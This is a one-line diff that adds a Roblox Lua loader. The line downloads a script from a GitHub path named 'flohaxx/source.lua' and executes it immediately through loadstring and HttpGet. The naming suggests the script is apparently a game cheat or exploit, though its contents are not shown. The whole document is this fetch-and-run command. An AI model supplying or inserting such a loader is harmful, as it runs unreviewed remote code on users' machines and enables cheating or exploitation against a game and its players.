@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/inveris1337/dumping_nn/refs/heads/main/flohaxx/source.lua",true))()
